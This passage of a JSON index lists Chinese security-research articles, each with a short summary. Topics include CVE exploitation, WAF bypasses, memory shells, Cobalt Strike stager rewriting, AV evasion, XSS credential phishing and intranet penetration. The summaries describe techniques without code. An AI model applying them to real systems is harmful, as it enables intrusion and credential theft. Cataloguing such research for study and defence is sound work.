        "page_content": "该文档分析了 DedeCMS 中的两个漏洞：一个任意代码注入漏洞 (CVE-2022-36216) 和一个任意文件删除漏洞 (CVE-2022-30508)。通过组合使用这两个漏洞，攻击者可以绕过对 password.data.php 文件的保护，从而实现无限代码注入。",
        "FileName": "12526-DedeCMS组合漏洞分析.pdf"
    },
    {
        "page_content": "本文介绍了 Android APP 测试中四种主要组件（Activity、Content Provider、Broadcast Receiver 和 Service）的安全测试方法。通过使用 drozer 工具，可以对这些组件进行攻击面分析、漏洞扫描和利用，从而发现和修复潜在的安全问题。",
        "FileName": "12092-Android APP-四大组件安全测试.pdf"
    },
    {
        "page_content": "本文分析了 CobaltStrike 控制端登录 TeamServer 的流程，包括密码验证、信息交换和数据同步。在密码验证中，Controller 发送密码和填充字符，TeamServer 验证后返回标志位。随后，TeamServer 创建 Socket 和 ManageUser 来处理 Controller 信息，Controller 创建 TeamQueue 进行通信。Controller 发送 aggressor.authenticate 请求，TeamServer 验证后返回 SUCCESS 并启动 BroadcastWriter 线程。Controller 接收 Reply，发送 aggressor.metadata 请求，TeamServer 处理后发送回传信息。最后，TeamServer 处理数据同步，发送 transcripts 和 replayme 信息，Controller 接收并处理，完成登录流程。",
        "FileName": "10752-CobaltStrike逆向学习系列(1)：控制端登陆流程分析.pdf"
    },
    {
        "page_content": "该文档分析了如何将 JavaScript 代码隐藏在 PNG 图像中，以绕过内容安全策略 (CSP)。通过利用 HTML Canvas 将恶意 JavaScript 代码转换为 PNG 图像，可以上传到允许图像的白名单网站（如 Twitter），然后使用 getImageData 方法从图像中提取隐藏的 JavaScript 代码并执行。该技术利用了 CSP 配置中的宽松策略，允许整个域进入白名单，以及 Twitter 向所有上传图像发送通配符访问源响应报头。",
        "FileName": "7530-如何将JavaScript隐藏在PNG图像中来绕过CSP.pdf"
    },
    {
        "page_content": "本文档探讨了在 Tomcat 中使用 Filter 型内存马的原理和实现方法。通过分析 Tomcat 处理请求的流程，作者详细介绍了如何通过动态添加恶意 Filter 来构造内存马。文档还提供了代码示例和调试步骤，帮助读者理解 Filter 注册流程和如何控制 filterMaps、filterConfigs 和 filterDefs 变量以注入恶意 Filter。",
        "FileName": "10362-Tomcat 内存马（二）Filter型.pdf"
    },
    {
        "page_content": "本文档详细介绍了作者如何跟踪 Log4j 漏洞的原理，并发现了绕过 WAF 的技巧。作者通过分析 Log4j 代码库的提交记录，了解了漏洞的形成原因，并通过跟踪 JndiManager.lookup 方法的修改，发现了绕过 2.15.0-rc1 版本的技巧。此外，作者还提供了绕过 LDAP WAF 的技巧，包括 URI 解析、LDAP 发起和 Bypass WAF 技巧。",
        "FileName": "10661-我是如何跟踪log4j漏洞原理及发现绕WAF的tips.pdf"
    },
    {
        "page_content": "本文分析了基于框架漏洞的代码审计实战，以某开源 CMS 为例，介绍了如何通过黑盒和白盒测试相结合，利用框架漏洞进行代码审计。文章重点分析了反序列化漏洞的触发点，包括 unserialize 函数、phar 反序列化和 session 反序列化，并详细介绍了如何利用 phar 文件和 thinkphp 反序列化漏洞进行远程命令执行。",
        "FileName": "11360-基于框架漏洞的代码审计实战.pdf"
    },
    {
        "page_content": "该文档分析了 Fastjson 1.2.68 版本中远程代码执行漏洞的成因和利用方法。漏洞源于 checkAutoType 方法中对 expectClass 参数的限制绕过，攻击者可以通过构造一个反序列化链，将 java.lang.AutoCloseable 接口作为 expectClass 参数，绕过 AutoType 检测，获得恶意类型，从而执行命令。",
        "FileName": "7878-某json = 1.2.68 远程代码执行漏洞分析.pdf"
    },
    {
        "page_content": "该文档详细分析了 CVE-2022-28219 漏洞，该漏洞利用了 ZOHO ManageEngine ADAudit Plus 中的 XXE 和反序列化漏洞，通过 XXE 上传恶意序列化 payload，再通过反序列化触发 RCE，最终实现远程代码执行。",
        "FileName": "11506-CVE-2022-28219 ZOHO ManageEngine ADAudit Plus XXE到RCE.pdf"
    },
    {
        "page_content": "该文档分析了智能合约反汇编的过程，使用 Online Solidity Decompiler 在线网站对一个简单的智能合约进行反汇编，并详细解释了反汇编后的指令，包括 PUSH、CALLDATASIZE、LT、JUMPI、CALLDATALOAD、DIV、AND、EQ 等指令的含义和作用，以及这些指令如何影响栈中的数据和控制流程。",
        "FileName": "8655-智能合约安全系列文章反汇编·上篇.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2018-2628 Weblogic 反序列化漏洞，该漏洞影响 Weblogic 10.3.6.0、12.1.3.0、12.2.1.2 和 12.2.1.3 版本，可通过 T3 协议在未经身份验证的情况下远程执行任意代码。该漏洞的利用方式包括通过 CVE-2016-1000031 Apache Commons Fileupload 进行任意文件写入，以及通过 ysoserial-JRMP 模块进行远程代码执行。",
        "FileName": "8073-CVE-2018-2628 Weblogic反序列化漏洞分析.pdf"
    },
    {
        "page_content": "本文分析了 SolarWinds 供应链攻击中 Sunburst 后门的技术细节，包括代码执行、环境检测和 C2 通信。攻击者利用 SolarWinds.Orion.Core.BusinessLayer.dll 中的恶意代码，通过 DNS 和 HTTP 协议与 C2 服务器进行通信，并使用自定义的 DGA 算法生成域名。后门还具有高度迷惑性的特征，如数字签名、多层调用和自定义哈希算法，以规避检测。本文强调了红队在隐蔽作战中的重要性，并提供了针对 SolarWinds 供应链攻击的检测和响应建议。",
        "FileName": "8986-【高级持续性威胁跟踪】红队视角看Sunburst后门中的TTPs.pdf"
    },
    {
        "page_content": "该文档分析了某 CMS 系统中登录认证模块的代码缺陷，发现该模块在处理登录请求时存在 SQL 查询语句设计缺陷，导致攻击者可以绕过密码验证，直接使用 admin 账号登录系统。",
        "FileName": "7476-记对某CMS的一次代码审计.pdf"
    },
    {
        "page_content": "该文档记录了一次对 C/S 架构系统的 SQL 注入攻击，攻击者通过分析数据包并修改 SQL 语句，成功执行了恶意 SQL 代码。攻击者使用 BurpSuite 抓取流量，并利用其 GZIP 解码功能查看请求和响应包。通过替换原始 SQL 语句并将其转换为 16 进制形式，攻击者构造了恶意 SQL 代码并将其重新发送给服务器，从而成功执行了 SQL 注入。",
        "FileName": "7536-某cs架构系统的一次sql注入记录.pdf"
    },
    {
        "page_content": "该文档详细介绍了对某网络广播对讲设备进行的审计，发现了多个漏洞，包括任意文件上传、任意文件读取、任意命令执行、任意文件写入和任意文件下载。此外，还发现了未授权访问和后门账户，允许恶意登录。",
        "FileName": "10737-某网络广播对讲设备审计.pdf"
    },
    {
        "page_content": "该文档分析了 Mozilla Rhino 中的一个利用链，该利用链涉及 ScriptableObject、GetterSlot、NativeJavaMethod 和 NativeError 类。攻击者可以通过构造恶意 TemplatesImpl 对象并利用 toString 方法中的调用链来触发命令执行。",
        "FileName": "11831-[Java安全]关于Rhino的一些姿势利用.pdf"
    },
    {
        "page_content": "CVE-2020-5405 漏洞影响 Spring Cloud Config，允许攻击者通过路径穿越攻击读取任意文件。该漏洞源于 Spring Cloud Config 服务端对路径的处理不当，导致攻击者可以通过精心构造的请求绕过安全检查，访问受保护的文件。受影响版本包括 2.2.x -- 2.2.2 和 2.1.x -- 2.1.7。",
        "FileName": "8303-CVE-2020-5405 Spring Cloud Config 路径穿越漏洞浅析.pdf"
    },
    {
        "page_content": "本文档介绍了如何逆向分析容器镜像，包括使用 Docker 和 DIVE 工具查看镜像的结构、层和历史记录。通过分析镜像，可以了解镜像的组成、层之间的差异以及容器操作对镜像的影响。",
        "FileName": "11262-记录一次逆向容器镜像的过程.pdf"
    },
    {
        "page_content": "该文档介绍了 DVWA 靶场中的文件包含漏洞，包括本地文件包含和远程文件包含，并分析了不同安全级别的代码如何处理文件包含请求。文档还提供了利用文件包含漏洞的示例，并讨论了如何通过过滤和白名单机制来缓解该漏洞。",
        "FileName": "12029-DVWA靶场之File Inclusion学习分享.pdf"
    },
    {
        "page_content": "该文档介绍了如何绕过云锁最新版 SQL 注入 WAF，包括绕过 and 1=1、order by、union select 等过滤规则，并提供了查询数据库名、表名、列名、字段、数据库名长度等信息的示例查询语句。",
        "FileName": "7599-云锁最新版SQL注入WAF绕过.pdf"
    },
    {
        "page_content": "该文档详细介绍了 \"造轮子\" 文件上传靶场的知识点，包括前端验证绕过、MIME 类型校验、图片文件头校验、代码审计等，并提供了详细的解题思路和代码示例。",
        "FileName": "8435-「造轮子」一个文件上传靶场知识总结记录.pdf"
    },
    {
        "page_content": "本文分析了某 CMS 上传 GetShell 原理，在 Windows 环境下，通过利用冒号截断和 Windows 通配符特性，绕过伪白名单限制，实现了两种方法来上传 PHP 脚本并获取 Shell 权限。",
        "FileName": "11233-分析某CMS上传GetShell原理-Window.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用某 CMS 后台文件上传漏洞上传插件，绕过安全检查，最终在网站根目录下创建恶意插件并获取 shell 权限。",
        "FileName": "10819-某cms后台文件上传.pdf"
    },
    {
        "page_content": "该文档主要介绍了在CTF比赛中利用各种技术来干扰其他参赛者的操作，包括利用内存马、DOS攻击、修改文件权限、利用弱口令等手段。文档还提供了相应的Python脚本和代码示例，方便读者理解和使用。",
        "FileName": "8590-打比赛捣蛋的奇招妙想附脚本.pdf"
    },
    {
        "page_content": "本文档介绍了暴⼒破解技术，包括其概述、基于表单的暴⼒破解、验证码绕过和 token 防爆破。暴⼒破解是一种攻击手段，通过尝试大量认证信息来获取目标系统的认证信息。本文档提供了详细的步骤和示例，说明如何使用 Burp Suite 和 Python 脚本进行暴⼒破解。",
        "FileName": "11992-Pikachu靶场-暴力破解.pdf"
    },
    {
        "page_content": "本文档分析了 lmxcms 代码审计，该 CMS 存在多个漏洞，包括前台 SQL 注入、后台任意文件删除、后台任意文件写入和后台 SQL 注入。文档详细介绍了漏洞的利用方法，并提供了代码示例和数据包分析。",
        "FileName": "11224-lmxcms代码审计-mvc架构练手首选.pdf"
    },
    {
        "page_content": "该文档分析了 PHP 和 Python 中的反序列化漏洞，重点关注 PHP 中的魔术方法和 Python 中的 pickle 模块。它解释了序列化和反序列化的过程，并提供了示例代码来说明如何利用这些漏洞进行攻击，例如命令执行和文件读取。",
        "FileName": "7751-php和python反序列化漏洞分析.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Java 反射，它是一种通过代码获取类、对象、方法等信息的机制。反射可以用于动态创建对象、调用方法、获取成员变量等，在框架设计中扮演着重要的角色。文档详细介绍了获取 Class 对象、获取成员变量、获取构造方法、获取成员方法、获取类名等反射功能，并提供了示例代码进行说明。",
        "FileName": "9921-结合框架理解Java反射.pdf"
    },
    {
        "page_content": "D-Link DIR-859 路由器存在一个未经身份验证的远程代码执行漏洞 (CVE-2019-17621)，该漏洞允许攻击者通过 UPnP 请求在设备上执行任意代码。该漏洞源于 genacgi_main() 函数中对 URL 结构的验证不充分，攻击者可以利用此漏洞通过构造特定的 URL 请求来控制文件名，从而在设备上创建恶意脚本并执行任意命令。",
        "FileName": "7039-D-Link DIR-859 —未经身份验证的RCE(CVE-2019–17621).pdf"
    },
    {
        "page_content": "**主题：** CMS 系统的漏洞分析和复现\n\n**内容：** 文档分析了多个 CMS 系统（包括 Finecms、Dedecms、Scms、Douphp、UsualtoolCMS、Phpmyadmin、Duomicms、IBOS 和信呼协同办公系统）中的漏洞，包括存储型 XSS、CSRF、XXE 实体注入、代码执行、变量覆盖、命令执行和 CGI 解析漏洞。文档提供了漏洞复现步骤和利用方法，有助于安全研究人员和渗透测试人员了解和利用这些漏洞。",
        "FileName": "9924-关于一些cms系统的漏洞分析以及复现（甲）.pdf"
    },
    {
        "page_content": "本文逆向分析了 Cobalt Strike 4.7 的 stager 部分，并尝试用 C 语言重写 stager 的 shellcode。通过遍历 PEB 和导出表，重写的 shellcode 可以获取所需的 Win32 API 函数，并通过调用这些函数向 C2 服务器发起 HTTP 请求，建立连接，读取 beacon 内容并为其分配内存，最后跳转执行 beacon。",
        "FileName": "12194-CS 4.7 Stager 逆向及 Shellcode 重写.pdf"
    },
    {
        "page_content": "这篇文档介绍了 Windows 平台上的 pwn 初探，包括环境搭建、保护机制分析和栈溢出漏洞利用。文档详细介绍了 winpwn 工具的使用，并通过一个经典的栈溢出漏洞利用示例演示了如何劫持程序流并获取 shell。",
        "FileName": "11865-win pwn初探（一）.pdf"
    },
    {
        "page_content": "该文档详细介绍了 Facebook OAuth 框架中的一个漏洞，该漏洞允许攻击者劫持 OAuth 流程并获取用户帐户的访问令牌。该漏洞利用了 Facebook SDK 中的错误配置，该错误配置允许跨域通信，并利用了 page_proxy 资源中的代码更改，该更改允许攻击者在没有用户交互的情况下窃取令牌。该漏洞已修复，Facebook 已采取措施防止进一步的攻击。",
        "FileName": "7323-BugBounty-Facebook OAuth 框架漏洞.pdf"
    },
    {
        "page_content": "本文探讨了绕过 WAF（Web 应用程序防火墙）进行 SQL 注入攻击的技术，重点关注 SQL 语法功能和技巧。作者通过 fuzz、逆向等手段，挖掘和组合各种 SQL 功能语法，绕过主流 WAF 的策略和规则，实现对数据库数据的访问和操作。",
        "FileName": "7767-WAF绕过之SQL注入（归来）.pdf"
    },
    {
        "page_content": "Java 反射机制是一种间接操作目标对象的机制，通过获取 Class 对象，可以动态创建 Java 类实例、调用任意类方法、修改任意类成员变量值等。反射机制在 Java 开发中具有很强的灵活性，但需要注意其对私有权限的访问限制，可以通过 setAccessible(true) 方法突破访问权限检查。",
        "FileName": "9117-JAVA安全基础（二）-- 反射机制.pdf"
    },
    {
        "page_content": "该文档分析了文件上传漏洞的成因和利用条件，并介绍了客户端和服务器端检测文件上传的常见方法，包括 JavaScript 检测、MIME 类型检测、目录路径检测、文件扩展名检测和文件内容检测。文档还提供了绕过这些检测方法的示例，并建议了防御策略，例如严格规范文件上传处理逻辑、检查文件后缀名、内容类型和内容，以及修复服务器端解析类漏洞和文件包含类漏洞。",
        "FileName": "7365-浅析文件上传漏洞.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2021-2394 漏洞，该漏洞影响 Oracle WebLogic Server，攻击者可以通过 IIOP 或 T3 协议未经授权访问存在漏洞的组件，并接管 WebLogic Server。漏洞利用了 Coherence 组件中的 ExternalizableLite 接口和 ExternalizableHelper 类，通过一系列方法调用绕过黑名单列表，最终导致 JNDI 注入和任意方法执行。",
        "FileName": "10245-weblogic漏洞分析之CVE-2021-2394.pdf"
    },
    {
        "page_content": "本文档探讨了 Java 中的远程代码执行 (RCE) 漏洞，重点关注通过 Java 执行系统命令、Java 序列化和反序列化、RMI、JRMP、JNDI、JNDI 注入、SpringBoot Actuators、FasterXML/jackson-databind 漏洞等技术实现 RCE。它还提供了缓解措施和修复建议，以帮助开发人员保护他们的应用程序免受这些漏洞的影响。",
        "FileName": "7327-春眠不觉晓，RCE知多少？.pdf"
    },
    {
        "page_content": "该文档介绍了 Java Weblogic-T3 协议漏洞，该漏洞允许攻击者通过生成恶意序列化数据并将其发送到 Weblogic 服务器来执行任意代码。文档提供了漏洞复现的步骤，并分析了漏洞利用的原理，包括反序列化过程和 Weblogic 中 InboundMsgAbbrev 类的 readObject 方法中的 resolveClass 方法。",
        "FileName": "11078-Java weblogic-T3协议漏洞.pdf"
    },
    {
        "page_content": "本文介绍了参加黑客松 (HW) 的技巧，包括信息收集、目标选择、获取 shell、测试地点和一些其他技巧。作者强调了信息收集的重要性，建议使用各种工具和技术来扩大资源并了解渗透目标。在目标选择方面，作者优先考虑学校、化工、交通、能源、论坛和企业，因为这些目标通常具有丰富的资源和较低的防御水平。作者还提供了获取 shell 的多种方法，包括利用已知漏洞、弱口令、上传、未授权访问、注入和 XSS。此外，作者分享了在 HW 中测试地点和一些其他技巧，例如利用 Java 框架、使用 Xray、在资源共享时提交报告以及利用 SQL 注入和逻辑漏洞。",
        "FileName": "8265-hw小技巧.pdf"
    },
    {
        "page_content": "这篇博文详细介绍了研究人员如何通过模拟模糊测试发现 Titan M 固件中的一个漏洞，该漏洞允许他们在芯片上执行代码。他们利用这个漏洞开发了一个利用程序，可以泄露存储在芯片上的敏感数据，包括受 StrongBox 保护的密钥。该漏洞已于 2022 年 5 月报告给谷歌，并在 2022 年 6 月的 Pixel 安全更新中发布了修复程序。",
        "FileName": "12299-仅用一个字节攻击 Titan M.pdf"
    },
    {
        "page_content": "该文档分析了 WCTF2020 Thymeleaf 比赛中出现的多种 payload 形式，解释了 Spring 和 Thymeleaf 如何配合处理模板注入，并提供了在不同场景下成功利用漏洞的 payload 格式。",
        "FileName": "8568-由WCTF2020 Thymeleaf分析payload形式.pdf"
    },
    {
        "page_content": "该文档分析了 Spring Cloud Config 中的目录穿越漏洞，该漏洞允许攻击者通过精心设计的请求访问受保护的文件。补丁通过添加路径验证和限制特殊字符来修复此漏洞，但后续分析发现通过替换字符和配置本地加载可以绕过这些限制，从而导致文件读取。",
        "FileName": "7558-spring-cloud-config目录穿越漏洞分析.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 XSS 漏洞制作钓鱼页面，通过绕过 WAF，利用不闭合的 `<textarea>` 标签吸收多余代码，最终诱导用户输入网站账号密码，并将其发送到攻击者搭建的服务器上，实现神不知鬼不觉的账号密码窃取。",
        "FileName": "9549-利用一处xss漏洞制作钓鱼页面.pdf"
    },
    {
        "page_content": "本文档分析了 2022 年杭州网络安全技能大赛的部分 WriteUp，包括登录站点、NodeJS 登录、SSRF、原型链污染、RCE、ZipCrypto Store/Deflate、哥斯拉流量、Reverse Dual personality 等内容。",
        "FileName": "12128-西湖论剑·2022中国杭州网络安全技能大赛 部分WriteUp.pdf"
    },
    {
        "page_content": "该文档分析了 Defcon 资格赛中的两道 Pwn 题目，分别是 smuggler's cove 和 constricted。smuggler's cove 利用了 JIT Spray 技术，通过构造浮点数来形成 shellcode 链，最终执行命令。constricted 则基于 BOA 的 TimeCache 漏洞，通过 UAF 和类型混淆实现任意地址读写，并利用栈喷和 ROP 完成漏洞利用。",
        "FileName": "11445-DEFCON-Qualifier-2022 pwn smuggler's coveconstricted 题解.pdf"
    },
    {
        "page_content": "该文档分析了 VMPwn 问题，VMPwn 泛指实现一些运算指令来模拟程序运行的 Pwn 题。文档首先介绍了 VMPwn 的基本设计，然后通过分析汇编类和编译器类 VMPwn 的典型题目，总结了这类问题的核心思路和解题步骤。",
        "FileName": "7787-VMPwn之温故知新.pdf"
    },
    {
        "page_content": "该文档介绍了跨站脚本 (XSS) 漏洞的类型、形成原因、危害和防御措施。它详细解释了反射型、存储型和 DOM 型 XSS 漏洞，并提供了绕过过滤和盲打攻击的示例。文档还讨论了 htmlspecialchars() 函数和 href 属性在 XSS 防御中的作用。",
        "FileName": "11994-Pikachu靶场-Cross-Site Scripting.pdf"
    },
    {
        "page_content": "**主题：** PHP 反序列化字符逃逸\n\n**内容：** 本文详细介绍了 PHP 反序列化字符逃逸的原理和构造方法，包括字符增多和字符减少两种情况。通过分析示例代码和真实题目的解析，阐述了如何利用字符逃逸修改序列化数据中的值，从而实现攻击目的。",
        "FileName": "9213-PHP反序列化 — 字符逃逸.pdf"
    },
    {
        "page_content": "该文档介绍了一种构造 JRE8u20 Gadget 的简化方法，该方法利用了 LinkedHashSet 和 BeanContextSupport 中的序列化漏洞。通过修改序列化字节码，可以将 BeanContextSupport 反序列化为指定对象，从而触发远程代码执行。",
        "FileName": "8277-以一种更简单的方式构造JRE8u20 Gadget.pdf"
    },
    {
        "page_content": "该文档介绍了如何在 ring0 下实现内联挂钩，具体来说，它展示了如何修改 ring0 下的 ZwOpenFile 函数，以便在函数执行时打印一些信息，例如进程名称。该文档还提供了完整的代码示例，展示了如何关闭页面只读保护、覆盖硬编码、写入内存以及恢复页面只读保护。",
        "FileName": "10913-ring0下的Inline hook.pdf"
    },
    {
        "page_content": "该文档探讨了 Windows 平台上 Rootkit 的运行效果和应用，重点关注攻击者在攻击中使用的技术手段，包括 Turla 组织、紫狐网络、方程式组织等案例，并分析了 Rootkit 检测技术的发展现状和挑战。",
        "FileName": "11206-【Rootkit系列研究】Windows平台高隐匿、高持久化威胁（二）.pdf"
    },
    {
        "page_content": "该文档讨论了如何对 Dubbo 的 Hessian2 反序列化进行安全加固，建议通过创建自定义的 Hessian2 序列化工具并将其注册到 Dubbo SPI 中，或修改 Dubbo 源代码来实现。文档还提供了三个自定义的 Hessian2 序列化类，并指导用户在服务端配置序列化方式和加入反序列化黑名单类以增强安全性。",
        "FileName": "7238-dubbo反序列化问题-Hessian2安全加固和修复.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2017-0263 Win32k 漏洞，该漏洞是一个 UAF 漏洞，导致了 Double Free。该漏洞的利用过程涉及创建特殊的菜单窗口对象，释放弹出菜单对象，然后再次释放弹出菜单对象，从而导致 BSOD。利用代码使用了一个自定义事件通知处理程序来在菜单弹出时发送 MN_ENDMENU 消息，从而触发漏洞。该文档还提供了漏洞的 PoC 和分析。",
        "FileName": "9287-CVE-2017-0263 Win32k漏洞分析笔记.pdf"
    },
    {
        "page_content": "该文档分析了某 CMS 前台 RCE 漏洞，该漏洞利用了变量覆盖和模板渲染机制，攻击者可以通过控制模板文件名和参数来执行任意代码。漏洞利用过程涉及到对代码的深入分析和对模板解析机制的理解，最终通过构造特定 payload 成功获取了远程代码执行权限。",
        "FileName": "10002-某cms 前台RCE漏洞分析.pdf"
    },
    {
        "page_content": "该文档分析了 Atlassian JIRA 服务器模板注入漏洞，该漏洞允许攻击者通过向模板文件中注入恶意代码来执行任意代码。文档详细介绍了漏洞的复现、修复和挖掘过程，并讨论了如何限制类调用栈和绕过黑名单以利用该漏洞。",
        "FileName": "11354-Atlassian JIRA服务器模板注入漏洞分析及挖掘.pdf"
    },
    {
        "page_content": "该文档详细介绍了在内网渗透靶场中利用各种漏洞和技术，包括Weblogic漏洞、永恒之蓝、MS14-058提权、Psexec横向移动和黄金票据权限维持，成功渗透内网并获取域控权限的过程。",
        "FileName": "9851-记一次内网渗透靶场学习.pdf"
    },
    {
        "page_content": "本文档介绍了 Kubernetes 集群的安全评估和测试方法，包括基本概念、主要组件、架构、安全评估测试方法等维度，涵盖了 Kubernetes API Server 未授权、容器管理、反弹 shell、ETCD 未授权访问、Kubelet API 未授权、Kubernetes Dashboard 未授权访问等常见安全漏洞的检测和利用方法。",
        "FileName": "12921-K8s集群安全攻防(上).pdf"
    },
    {
        "page_content": "该文档主要介绍了作者通过分析 webpack 打包的源码，发现后台地址并进行常规信息收集和初步测试，最终通过 GitHub 泄露的源码找到了 ueditor 和 swfupload 两个入手点，利用 swfupload 的任意文件删除漏洞成功执行代码。",
        "FileName": "8547-从webpack开始发现的漏洞大礼包.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Fastjson 漏洞的分析和利用方法，包括黑盒测试和白盒审计两种方式。黑盒测试主要通过分析 Fastjson 的依赖包和函数来寻找漏洞，而白盒审计则通过审查 Fastjson 的源代码来发现漏洞。文档还提供了利用 Fastjson 漏洞的 POC 代码和一些小技巧。",
        "FileName": "7104-某json 黑盒盲测与白盒审计.pdf"
    },
    {
        "page_content": "该文档介绍了如何通过构造内存马在 Resin 服务器中加载恶意 Filter，该 Filter 可以执行任意 Java 代码，从而实现远程代码执行。文档详细描述了获取 Resin 上下文、加载恶意 Filter 和将其注入上下文的过程，并提供了 Java 代码示例。",
        "FileName": "12147-Resin内存马分析.pdf"
    },
    {
        "page_content": "该文档记录了一次渗透测试的经历，测试者利用永恒之蓝漏洞和代理脚本渗透到目标内网，并尝试获取域控权限。测试过程中遇到了各种困难，包括代理不稳定、路由问题和防护设备，最终通过修改payload参数和添加路由成功获取了目标权限。",
        "FileName": "8475-半途而废的测试(二).pdf"
    },
    {
        "page_content": "该文档介绍了绕过某狗 SQL 注入 WAF 的多种方法，包括绕过 and 1=1、order by、union select、database()、schema_name、table_name、column_name、from 和布尔盲注。这些方法可以用于查询数据库名、表名、列名和字段内容，从而绕过 WAF 的限制。",
        "FileName": "7430-某狗SQL注入WAF绕过.pdf"
    },
    {
        "page_content": "该文档介绍了两个 CTF 中的 SQL 注入题目，其中第一个题目涉及使用 union select 语句获取表名和字段名，最终获得 flag；第二个题目涉及使用报错注入获取表名、字段名和 flag，并强调了在使用报错注入时需要注意的语法替换问题。",
        "FileName": "12210-CTFer成长之路之CTF中的SQL注入.pdf"
    },
    {
        "page_content": "PyYAML 是一个用于处理 YAML 数据的 Python 库，它允许将 YAML 数据反序列化为 Python 对象。然而，在 PyYAML 5.1 之前的版本中，存在一个反序列化漏洞，允许攻击者通过精心设计的 YAML 输入执行任意代码。该漏洞已在 PyYAML 5.1 中修复，可以通过使用 FullLoader 或 UnsafeLoader 加载器来避免。",
        "FileName": "7923-浅谈PyYAML反序列化漏洞.pdf"
    },
    {
        "page_content": "本文档探讨了绕过 PHP 中 open_basedir 限制的几种方法，该限制用于限制用户访问指定目录之外的文件。这些方法包括利用 glob:// 伪协议、DirectoryIterator 类、symlink 函数、bindtextdomain 函数、SplFileInfo::getRealPath() 方法和 chdir 函数与 ini_set 函数的组合。",
        "FileName": "10070-从0学习bypass open_basedir姿势.pdf"
    },
    {
        "page_content": "MIPS 架构是一种精简指令集（RISC）处理器架构，广泛用于电子产品、网络设备、个人娱乐设备和商业设备中。MIPS 汇编语言允许我们使用相应的代码来编写指令，其中包括寄存器、机器周期、汇编语句等基本概念。MIPS 汇编中共有 32 个通用寄存器，其中 $t0-$t7 用于临时变量，$s0-$s7 用于保存寄存器，$fp 用于帧指针，$ra 用于存放返回地址。MIPS 汇编还提供了加载/存储指令集、算术指令集、控制流结构、子程序调用、系统调用和 I/O 等功能。",
        "FileName": "12400-关于MIPS汇编的二三事.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 HOSTS 碰撞技术突破边界，访问内网系统。通过搜集指向内网 IP 的域名，并使用 Hosts_scan 工具匹配域名和 IP，可以发现可进行 HOSTS 碰撞的域名。然后，在 Burp Proxy 中设置 Host 头的 Replace 规则，即可访问设置的内网系统，从而进行进一步的渗透测试。",
        "FileName": "9590-利用HOSTS碰撞突破边界.pdf"
    },
    {
        "page_content": "该文档介绍了 wJa 工具，该工具用于分析 Java 应用程序中的 SQL 注入和 SSRF 漏洞。它使用污点分析来跟踪数据流，并使用 Cheetah 脚本语言编写测试脚本。文档提供了使用 wJa 分析 Spring 靶场的示例，并展示了如何检测和利用 SQL 注入漏洞。",
        "FileName": "10720-wJa（java闭源项目的自动化白盒+黑盒测试工具）.pdf"
    },
    {
        "page_content": "该文档记录了一次成功挖掘帆软报表系统漏洞的经历，包括信息收集、漏洞测试、密码解密、任意文件读取、未授权命令执行等步骤，最终成功反弹 shell，证明了漏洞的危害性。",
        "FileName": "11064-记录一次SRC挖掘经历.pdf"
    },
    {
        "page_content": "本文介绍了一种获取 Tomcat 全版本 StandardContext 的新方法，该方法通过遍历线程数组，找到 StandardEngine、StandardHost 和 StandardContext 对象，从而实现对 Tomcat 6、7、8、9 版本的兼容。",
        "FileName": "9914-Java内存马：一种Tomcat全版本获取StandardContext的新方法.pdf"
    },
    {
        "page_content": "JavaScript 中的原型链污染漏洞是指攻击者可以控制和修改对象的原型，从而影响所有继承该原型的实例对象。攻击者可以通过污染原型链在对象中添加或修改属性，从而导致代码执行或其他安全问题。",
        "FileName": "10032-谭谈 Javascript 原型链与原型链污染.pdf"
    },
    {
        "page_content": "本文档分析了 Java 中 JDBC 和 Mybatis 框架中 SQL 注入的原理和防御措施。JDBC 中，使用 Statement 会导致 SQL 注入，而使用 PrepareStatement 可以通过预编译防止注入。Mybatis 中，使用 ${} 传参会拼接 SQL 语句，导致注入，而使用 #{} 传参会预编译，防止注入。此外，文档还介绍了 Hibernate 中 HQL 和原生的 SQL 语句的注入风险和防御措施。",
        "FileName": "10686-审计JAVA下的SQL注入.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Chrome 扩展开发，包括其定义、架构、API 使用、内容脚本注入、脚本通信以及 Manifest V2 和 Manifest V3 之间的差异。它还提供了示例代码和 GitHub 项目链接，以帮助开发者快速入门 Chrome 扩展开发。",
        "FileName": "11794-Chrome扩展安全开发从零到一.pdf"
    },
    {
        "page_content": "该文档详细描述了针对学校内网进行渗透测试的过程，包括信息收集、漏洞利用、密码破解和横向渗透等技术，最终获得了对多台服务器的控制权。",
        "FileName": "8147-针对学校内网的一次渗透测试.pdf"
    },
    {
        "page_content": "该文档主要分析了 Flask debug 模式下的 PIN 码安全性，详细介绍了 PIN 码的生成流程，并提供了在 Linux 和 Windows 系统中获取 PIN 码所需变量值的具体方法。此外，还给出了一个例题，展示了如何利用 SSTI 和 RC4 加密来获取 PIN 码所需的变量值，从而绕过 PIN 码保护。",
        "FileName": "8092-Flask debug模式下的 PIN 码安全性.pdf"
    },
    {
        "page_content": "该文档详细描述了作者在攻防演练中通过分析伪装的 GitHub 信息泄漏，发现后门并进行溯源的过程。作者通过常规的 GitHub 敏感信息收集，发现了疑似 MySQL 账号密码泄漏，但进一步调查发现这是一个钓鱼陷阱。作者通过分析 VPN 客户端的 Python 代码，提取出隐藏在图像中的 shellcode，并溯源到红队人员的后门，最终定位到宿舍并通过 TG 联系到相关人员。",
        "FileName": "11275-记一次有趣的溯源.pdf"
    },
    {
        "page_content": "该文档介绍了 CPL（控制面板扩展项）文件，它是一种 Windows 控制面板扩展，可以用来绕过 Windows AppLocker 规则并执行恶意代码。文档提供了创建和使用 CPL 文件的详细说明，包括使用 shellcode 加载恶意代码的方法。此外，文档还讨论了如何使用白加黑技术绕过杀毒软件检测。",
        "FileName": "9957-巧用cpl文件维权和免杀.pdf"
    },
    {
        "page_content": "该文档详细介绍了从外网代码审计到内网渗透的攻击过程，包括利用各种漏洞获取内网权限、绕过安全措施、横向移动、提权和最终获取域控权限。攻击者通过代码审计、Bypass、免杀上线、ARP扫描、Redis未授权访问、IIS默认目录写权限、坏盘符提权、域内提权漏洞（CVE-2020-1472）和令牌窃取等技术，逐步渗透内网并最终控制域控，获取所有域内用户凭证和flag。",
